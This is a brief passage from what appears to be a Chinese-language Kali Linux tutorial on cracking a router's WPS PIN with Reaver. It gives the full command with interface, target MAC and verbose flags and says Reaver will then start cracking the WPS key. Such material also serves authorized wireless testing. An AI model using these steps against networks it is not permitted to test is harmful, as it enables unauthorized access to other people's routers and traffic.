    ```

    root@kali:~#

    ```


    - 2. 现在输入“reaver”，并添加接口开关“-i”、目标开关“-b”以及目标路由器的 MAC 地址，然后使用“-vv” 进行详细反馈。它看起来应该像这样：


    ```

    root@kali:~# reaver -i mon0 -b b8:a3:85:aa:00:01 -vv

    ```


    - 3. Reaver 将随后开始破解 WPS 密钥。


